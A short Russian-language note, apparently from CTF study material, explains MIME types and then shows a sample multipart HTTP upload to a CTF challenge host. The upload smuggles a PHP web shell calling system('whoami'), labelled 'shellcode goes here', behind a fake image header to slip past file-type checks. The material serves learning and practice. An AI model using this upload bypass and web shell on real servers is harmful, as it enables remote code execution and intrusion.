MIME - Тип носителя (также известный как многоцелевые расширения почты Интернета или тип MIME) указывает характер и формат документа, файла или набора байтов. Типы MIME определены и стандартизированы в документе IETF RFC 6838. Браузеры используют тип MIME, а не расширение файла, чтобы определить, как обрабатывать URL-адрес и правильно открыть файл.

пример:

	POST /second/level21/ HTTP/1.1
	Host: kslweb1.spb.ctf.su
	Content-Length: 248
	Cache-Control: max-age=0
	Accept-Language: ru-RU
	Upgrade-Insecure-Requests: 1
	Origin: http://kslweb1.spb.ctf.su
	**Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaWm41e5fF8CHbtJB**
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	Referer: http://kslweb1.spb.ctf.su/second/level21/
	Accept-Encoding: gzip, deflate, br
	Connection: keep-alive
	
	------WebKitFormBoundaryaWm41e5fF8CHbtJB 			#рандомное число, указывающее на начало передачи файлов
	Content-Disposition: form-data; name="myfile"; filename="rrrr.php" #имя загруженного файла
	Content-Type: application/x-php					#тип файла

	#содержание файла:
	PNG89a;
	<?php
	  system('whoami'); # shellcode goes here
	?>

	------WebKitFormBoundaryaWm41e5fF8CHbtJB--			#конец передачи файлов

